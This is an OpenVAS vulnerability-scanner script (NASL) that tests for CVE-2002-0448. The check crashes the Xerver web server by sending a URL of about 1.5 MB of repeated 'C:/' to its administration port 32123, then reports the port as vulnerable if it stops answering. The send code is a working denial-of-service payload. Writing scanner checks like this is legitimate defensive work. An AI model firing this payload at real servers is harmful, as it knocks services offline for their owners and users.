# OpenVAS Vulnerability Test
# $Id: Xerver_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Xerver web server DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash
the Xerver web server by sending a long URL 
(C:/C:/...C:/) to its administration port.

A cracker may use this attack to make this
service crash continuously.";

tag_solution = "upgrade your software";

# From Bugtraq :
# Date: Fri, 8 Mar 2002 18:39:39 -0500 ?
# From:"Alex Hernandez" <al3xhernandez@ureach.com> 

if(description)
{
 script_id(11015);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4254);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2002-0448");
 name = "Xerver web server DOS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Xerver DOS";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  family = "Denial of Service";

 script_family(family);
 script_require_ports(32123);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

port=32123;
if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (!soc) exit(0);
s = string("GET /", crap(data:"C:/", length:1500000), "\r\n\r\n");
send(socket:soc, data:s);
close(soc);

soc = open_sock_tcp(port);
if (! soc)
{
 security_warning(port);
 exit(0);
}

close(soc);


